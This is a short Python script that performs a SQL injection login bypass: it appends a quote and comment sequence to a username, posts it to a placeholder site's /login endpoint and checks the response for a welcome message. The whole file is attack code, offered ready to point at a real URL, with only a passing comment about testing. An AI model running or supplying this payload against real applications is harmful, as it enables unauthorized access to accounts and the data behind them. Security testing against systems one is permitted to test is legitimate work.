import os
import sys
from requests import get, post

# Define the URL of the vulnerable application
url = 'http://example.com'  # Change this to the actual URL of the application

# Function to perform SQL injection attack
def sql_injection(username, password):
    # Crafting the payload that will bypass login authentication
    # For example: username=admin' -- and password='password'
    data = {'username': f"{username}'--", 'password': password}
    
    # Sending the request to the server
    response = post(f"{url}/login", data=data)
    
    # Checking if we bypassed authentication
    if "Welcome back" in response.text:
        print("Login successful!")
    else:
        print("Failed to login.")

# Replace 'admin' and 'password' with the actual username and password you want to use for testing
sql_injection('admin', 'password')